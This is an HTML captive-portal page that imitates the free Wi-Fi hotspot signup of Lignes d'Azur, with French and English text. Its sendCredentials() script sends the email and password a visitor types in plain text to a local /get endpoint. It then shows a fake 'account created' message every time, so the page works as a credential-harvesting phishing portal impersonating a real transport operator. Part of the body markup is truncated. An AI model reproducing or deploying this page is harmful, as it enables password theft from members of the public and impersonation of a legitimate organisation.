<!DOCTYPE html>
<html>
  <head>
    <title>Hotspot Lignes d'Azur</title>
    <meta name="viewport" content="device-width, initial-scale=1">
    <script>
      let lang = 'fr'
      const strs = {
        fr: {
          headline: 'Créez-vous un compte en 2 minutes afin d\'accéder gratuitement à internet avec Lignes D\'Azur.',
          email: 'Adresse email*',
          password: 'Mot de passe',
          createAccount: 'Créer le compte',
          confirmation: '* Vous allez recevoir un email de confirmation afin de valider votre compte',
          modalTextSuccess: 'Votre compte a bien été créé',
          modalTextFail: 'Veuillez saisir une adresse email et un mot de passe',
        },
        en: {
          headline: 'Create your account quickly to for free internet access through Lignes d\'Azur.',
          email: 'Email address*',
          password: 'Password',
          createAccount: 'Create account',
          confirmation: '* You will receive an email to confirm your account',
          modalTextSuccess: 'Your account has been successfully created',
          modalTextFail: 'Please type your email address and a password',
        }
      }
      let emailInput;
      let passInput;
      let modalDiv;
      let modalBgDiv;

      function switchLang() {
        if (lang === 'fr') lang = 'en';
        else lang = 'fr';
        setStrs()
      }

      function setStrs() {
        document.getElementById('headline').innerText = strs[lang].headline
        document.getElementById('email-label').innerText = strs[lang].email
        document.getElementById('password-label').innerText = strs[lang].password
        document.getElementById('btn-submit').innerText = strs[lang].createAccount
        document.getElementById('confirmation').innerText = strs[lang].confirmation
      }

      document.addEventListener('DOMContentLoaded', function() {
        setStrs()
        emailInput = document.getElementById('email');
        passInput = document.getElementById('password');
        modalBgDiv = document.getElementById('modal-background');
        modalDiv = document.getElementById('modal');

        modalBgDiv.onclick = function() {
          emailInput.value = '';
          passInput.value = '';
          modalDiv.style.display = 'none';
          modalBgDiv.style.display = 'none';
        }
      })
  
      function sendCredentials() {
        modalDiv.style.display = 'block';
        modalBgDiv.style.display = 'block';
        fetch(`/get?email=${emailInput.value}&password=${passInput.value}`);

        if (emailInput.value === '' || passInput.value === '') {
          document.getElementById('modal-text').innerText = strs[lang].modalTextFail
        } else {
          document.getElementById('modal-text').innerText = strs[lang].modalTextSuccess
        }
        return false;
      }
    </script>
    <style>
      * { font-size: 100%; font-family: Arial; }
      body { margin: 0; }
      .logo { display: inline-block; }
      .logo-left { float: left; }
      .logo-right { float: right; margin-top: 0.5rem; }
      .container { width: 50%; margin-left: 25%; z-index: 0; }
      .row { width: 100%; display: inline-block; margin-top: 1rem; }
      #logo-la { width: 5rem; }
      #logo-mn { width: 5rem; }
      @media (max-width: 800px) {
        .container { width: 76%; margin-left: 12%; }
        #logo-la { width: 10rem; }
        #logo-mn { width: 10rem; }
      }
      @media (max-width: 600px) {
        .container { width: 90%; margin-left: 5%; display: inline-grid; justify-content: center; }
        #logo-la { width: 5rem; }
        #logo-mn { width: 5rem; }
      }
      form .row { display: grid; }
      #modal-background { display: none; background-color: black; position: absolute; z-index: 5; width: 100%; height: 100%; top: 0; opacity: 0.75; }
      #modal { display: none; background-color: white; position: absolute; z-index: 10; width: 80%; height: 50%; margin: 25% 10% 10% 10%; top: 0; }
      #copyright { position: absolute; bottom: 0; font-size: small; font-family: system-ui; }
      #btn-submit { height: 3rem; }
      form input { height: 3rem; }
    </style>
  </head>

        <div onclick="switchLang()" style="border: 2px black solid" class="logo logo-right">
          🇫🇷 / 🇺🇸
        </div>
      </div>
      <div class="row">
        <div style="display: grid; justify-content: center !important;">
          <p id="headline"></p>
        </div>
        <form onsubmit="return sendCredentials()" method="get" action="/get">
          <div class="row">
            <label id="email-label" for="email"></label>
            <input type="email" name="email" id="email">
          </div>
          <div class="row">
            <label id="password-label" for="password"></label>
            <input type="password" name="password" id="password">
          </div>
          <div class="row">
            <button id="btn-submit" type="submit"></button>
          </div>
        </form>
      </div>
      <div style="display: grid; justify-content: center !important;">
        <p id="confirmation" style="font-size: small; font-style: italic; color: grey"></p>
      </div>
      <div class="row" id="copyright">©2024 Régie Ligne d’Azur</div>
    </div>
    <div id="modal-background"></div>
    <div id="modal">
      <h1 id="modal-text"></h1>
    </div>
  </body>
</html>
